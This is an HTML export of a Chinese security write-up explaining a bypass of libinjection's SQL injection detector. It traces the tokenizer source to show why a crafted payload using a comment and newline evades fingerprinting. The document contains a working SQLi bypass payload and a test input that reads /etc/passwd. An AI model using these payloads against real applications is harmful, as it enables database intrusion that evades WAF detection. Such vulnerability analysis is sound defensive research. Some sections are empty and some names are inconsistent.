<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="libinjection-语义分析通用绕过"><span class="csDE05BCC">Libinjection </span><span class="csECDA2D3">语义分析通用绕过</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">源码下载地址</span><span class="cs8926E06"> </span><span class="cs9FB05234">https://github.com/client9/libinjection</span></p><p class="cs6FD73CFB"><span class="cs8926E06">example.c</span></p><p class="cs3A447A38"><span class="cs9FB05234">#include &lt;stdio.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;strings.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &lt;errno.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &quot;libinjection.h&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#include &quot;libinjection_sqli.h&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">int main(int argc, const char* argv[])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;struct libinjection_sqli_state state;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int issqli;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const char* input = argv[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size_t slen = strlen(input);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;/* in real-world, you would url-decode the input, etc */</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;libinjection_sqli_init(&amp;state, input, slen, FLAG_NONE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;issqli = libinjection_is_sqli(&amp;state);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (issqli) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr, &quot;sqli detected with fingerprint of &#39;%s&#39;\n&quot;, state.fingerprint);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return issqli;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ gcc -Wall -Wextra examples.c libinjection_sqli.c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ ./a.out &quot;-1&#39; and 1=1 union/* foo */select load_file(&#39;/etc/passwd&#39;)--&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sqli detected with fingerprint of &#39;s&amp;1UE&#39;</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">首先给一个</span><span class="cs5BEC2C28">pyload</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ./bin &quot;ad1n&#39;-- %a%0aunion select 1,database(),user() -- &quot; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">not sqli </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试</span><span class="cs8926E06">payload </span><span class="cs9C1B1871">是否</span><span class="cs8926E06">OK</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Libinjection/Libinjection%20%e8%af%ad%e4%b9%89%e5%88%86%e6%9e%90%e9%80%9a%e7%94%a8%e7%bb%95%e8%bf%87_files/image0.png" width="560" height="195" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为什么会这样呢</span><span class="cs8926E06">???</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先打开源码吧</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果对这个语义分析不太了解的吧，可以去百度上可以找到很多分析的文章这里就不过多阐述了</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下图是一个运行的一个流程图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Libinjection/Libinjection%20%e8%af%ad%e4%b9%89%e5%88%86%e6%9e%90%e9%80%9a%e7%94%a8%e7%bb%95%e8%bf%87_files/image1.png" width="560" height="205" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="它内部分为四种模式"><span class="csD6CA00D2">它内部分为四种模式</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">1. </span><span class="cs7FFD2630">无符号</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">标准</span><span class="cs9FB05234">SQL </span><span class="cs7FFD2630">模式</span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">2. </span><span class="cs7FFD2630">无符号</span><span class="cs9FB05234"> MySQL</span><span class="cs7FFD2630">模式</span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">3. </span><span class="cs7FFD2630">单引号</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">标准</span><span class="cs9FB05234">SQL </span><span class="cs7FFD2630">模式</span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">4. </span><span class="cs7FFD2630">单引号</span><span class="cs9FB05234"> MySQL </span><span class="cs7FFD2630">模式</span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">5. </span><span class="cs7FFD2630">双引号</span><span class="cs9FB05234"> MySQL </span><span class="cs7FFD2630">模式</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后上面是一个单引号的标准</span><span class="cs8926E06">SQL </span><span class="cs9C1B1871">的匹配</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">他的一个核心点在于如下</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数</span><span class="cs8926E06">libinjection_sqli_tokenize </span><span class="cs9C1B1871">作为一个转换内部字符的一个入口</span></p><p class="cs3A447A38"><span class="cs9FB05234">int libinjection_sqli_tokenize(struct libinjection_sqli_state * sf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pt2Function fnptr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size_t *pos = &amp;sf-&gt;pos;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;stoken_t *current = sf-&gt;current;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const char *s = sf-&gt;s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const size_t slen = sf-&gt;slen;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (slen == 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">​</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">初始化</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;st_clear(current);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sf-&gt;current = current;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">​</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (*pos == 0 &amp;&amp; (sf-&gt;flags &amp; (FLAG_QUOTE_SINGLE | FLAG_QUOTE_DOUBLE))) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*pos = parse_string_core(s, slen, 0, current, flag2delim(sf-&gt;flags), 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;</span><span class="cs7FFD2630">单引号双引号进入</span><span class="cs9FB05234">&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sf-&gt;stats_tokens += 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return TRUE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">​</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while (*pos &lt; slen) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">​</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* get current character</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const unsigned char ch = (unsigned char) (s[*pos]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* look up the parser, and call it</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* Porting Note: this is mapping of char to function</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* &nbsp;&nbsp;charparsers[ch]()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fnptr = char_parse_map[ch];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*pos = (*fnptr) (sf);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (current-&gt;type != CHAR_NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sf-&gt;stats_tokens += 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return TRUE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return FALSE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为什么</span><span class="cs9FB05234"># &quot;ad1n&#39;-- %a%0aunion select 1,database(),user() -- &quot;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这么一个简单的可以绕过呢。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先他是吧</span><span class="cs8926E06"> </span><span class="cs9FB05234">admi&#39;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">先进入无符号的标准</span><span class="cs8926E06">SQL </span><span class="cs9C1B1871">然后发现有一个</span><span class="cs8926E06">&#39; </span><span class="cs9C1B1871">后面就转到</span><span class="cs8926E06"> </span><span class="cs9C1B1871">单引号的标准</span><span class="cs8926E06">SQL</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">单引号标准</span><span class="cs8926E06">SQL </span><span class="cs9C1B1871">首先获取的</span><span class="cs9FB05234">admn&#39;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后</span><span class="cs8926E06">break</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续到了下一层碰到了一个</span><span class="cs8926E06"> - </span><span class="cs9C1B1871">那么走到</span><span class="cs8926E06">parse_dash</span><span class="cs9C1B1871">函数中</span></p><p class="cs3A447A38"><span class="cs9FB05234">static size_t parse_dash(struct libinjection_sqli_state * sf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const char *cs = sf-&gt;s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const size_t slen = sf-&gt;slen;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size_t pos = sf-&gt;pos;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">​</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (pos + 2 &lt; slen &amp;&amp; cs[pos + 1] == &#39;-&#39; &amp;&amp; char_is_white(cs[pos+2]) ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parse_eol_comment(sf);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else if (pos +2 == slen &amp;&amp; cs[pos + 1] == &#39;-&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parse_eol_comment(sf);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else if (pos + 1 &lt; slen &amp;&amp; cs[pos + 1] == &#39;-&#39; &amp;&amp; (sf-&gt;flags &amp; FLAG_SQL_ANSI)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sf-&gt;stats_comment_ddx += 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parse_eol_comment(sf);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;st_assign_char(sf-&gt;current, TYPE_OPERATOR, pos, 1, &#39;-&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return pos + 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后当前的</span><span class="cs8926E06">pos </span><span class="cs9C1B1871">一定是符合第一个判断条件的。继续跟踪</span><span class="cs8926E06">parse_eol_comment </span><span class="cs9C1B1871">函数</span></p><p class="cs3A447A38"><span class="cs9FB05234">static size_t parse_eol_comment(struct libinjection_sqli_state * sf)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const char *cs = sf-&gt;s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const size_t slen = sf-&gt;slen;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size_t pos = sf-&gt;pos;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const char *endpos =(const char *) memchr((const void *) (cs + pos), &#39;\n&#39;, slen - pos);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (endpos == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;st_assign(sf-&gt;current, TYPE_COMMENT, pos, slen - pos, cs + pos);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return slen;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;st_assign(sf-&gt;current, TYPE_COMMENT, pos, (size_t)(endpos - cs) - pos, cs + pos);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (size_t)((endpos - cs) + 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里只是判断了是否是有</span><span class="cs8926E06">\n </span><span class="cs9C1B1871">这个。然后就直接进入到</span><span class="cs8926E06">st_assign </span><span class="cs9C1B1871">函数中。继续跟踪</span><span class="cs8926E06">st_assign </span><span class="cs9C1B1871">函数</span></p><p class="cs3A447A38"><span class="cs9FB05234">static void st_assign(stoken_t * st, const char stype,size_t pos, size_t len, const char* value)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;const size_t MSIZE = LIBINJECTION_SQLI_TOKEN_SIZE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size_t last = len &lt; MSIZE ? len : (MSIZE - 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;st-&gt;type = (char) stype;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;st-&gt;pos = pos;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;st-&gt;len = last;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;memcpy(st-&gt;val, value, last);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;st-&gt;val[last] = CHAR_NULL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当前函数也是只是赋值了一下</span><span class="cs8926E06">val</span><span class="cs9C1B1871">然后就可以做任何操作。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后就是</span><span class="cs8926E06"> </span><span class="cs9FB05234">admin&#39;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">转换成了</span><span class="cs8926E06">S</span></p><p class="cs40DD2BC9"><span class="cs8926E06">-- </span><span class="cs9C1B1871">因为没有查询到直接是</span><span class="cs8926E06">C</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后得到的匹配规则为</span><span class="cs8926E06">SC </span><span class="cs9C1B1871">。此匹配规则不在数据库中。完成了绕过。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">附一张调试打印图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Libinjection/Libinjection%20%e8%af%ad%e4%b9%89%e5%88%86%e6%9e%90%e9%80%9a%e7%94%a8%e7%bb%95%e8%bf%87_files/image2.png" width="560" height="398" alt="" style="border-width:0px;" /></span></p></body>
</html>
